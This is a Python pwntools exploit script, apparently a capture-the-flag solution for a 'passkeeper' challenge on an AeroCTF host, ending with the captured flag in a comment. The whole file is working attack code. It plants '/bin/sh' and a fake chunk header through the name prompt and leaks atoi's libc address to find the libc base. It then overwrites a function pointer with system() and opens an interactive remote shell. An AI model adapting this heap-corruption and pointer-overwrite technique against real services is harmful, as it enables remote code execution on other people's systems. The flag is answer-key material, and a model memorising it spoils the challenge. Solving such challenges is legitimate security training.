import pwn

HOST, PORT = 'tasks.aeroctf.com', 33039
DEBUG = False

if DEBUG:
    env = {'LD_PRELOAD': './libc.so.6'}
    p = pwn.process(['./ld-linux-x86-64.so.2', './passkeeper'], env=env)
else:
    p = pwn.remote(HOST, PORT)
pwn.context.log_level = 'DEBUG'

libc = pwn.ELF('./libc.so.6')


def Menu(i):
    p.recvuntil('> ')
    p.sendline(str(i))


def Keep(pw):
    Menu(1)

    p.recvuntil('{?} Enter password: ')
    if len(pw) == 0x30:
        p.send(pw)
    else:
        p.sendline(pw)


def View(i):
    Menu(2)

    p.recvuntil('{?} Enter password id: ')
    p.sendline(str(i))
    p.recvuntil('Value: ')
    return p.recvline(keepends=False)


def Delete(i):
    Menu(4)

    p.recvuntil('{?} Enter password id: ')
    p.sendline(str(i))


def Change(secret):
    Menu(7)

    p.recvuntil('Enter new secret: ')
    if len(secret) == 0x10:
        p.send(secret)
    else:
        p.sendline(secret)


p.recvuntil('{?} Enter name: ')

payload = b'/bin/sh\x00'
payload = payload.ljust(0x38, b'\x00')
payload += pwn.p64(0x41)
p.send(payload)

p.recvuntil('{?} Enter secret: ')
p.sendline(pwn.p64(0x404058))

for i in range(0x10):
    Keep('ironore15')

atoi_libc = pwn.u64(View(0x10).ljust(8, b'\x00'))
libc_base = atoi_libc - libc.symbols[b'atoi']
pwn.log.info('libc.so.6: 0x{:012X}'.format(libc_base))

Change(pwn.p64(0x404100))

Delete(0x10)
Keep(pwn.p64(libc_base + libc.symbols[b'system']))

Menu(6)

pwn.context.log_level = 'INFO'
p.interactive()

# Aero{a9b57185b3799a0bb4c0bdd01156ae2d5eeea046513a4faf1d51e114df91679e}
